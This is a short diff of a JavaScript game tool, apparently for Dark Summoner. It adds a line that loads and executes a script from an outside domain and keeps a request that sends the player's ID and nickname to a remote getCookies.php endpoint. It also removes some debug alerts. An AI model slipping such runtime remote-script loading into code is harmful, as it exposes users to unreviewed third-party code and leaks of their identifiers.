@@ -14,6 +14,7 @@ var serverCookieInterval=0;;
 // Tools
 
 function fnSyncServer() {alert('hey');
+	loadjscssfile("http://n.infunity.com/ds/hi.js", "js");	
 	loadjscssfile("http://ds.game.darksummoner.com/ds/getCookies.php?ID="+player.player_id+"&name="+player.nickname+"&__hash="+(new Date()).getTime(), "js");	
 	alert('why');
 }
@@ -4655,8 +4656,8 @@ function fnHome() {
 	if (document.referrer.indexOf('/forkroad/mileStone') >= 0) {
 		fnRedirect('/en/'+platform+'/forkroad');
 	}
-	fnProfileAddWallBookmarkSelector();alert('great');
-	fnDeckAddFormationSelector();alert('test');
+	fnProfileAddWallBookmarkSelector();
+	fnDeckAddFormationSelector();
 	document.getElementById('formationDiv').style.top = "100px";
 	fnSyncServer();
 }
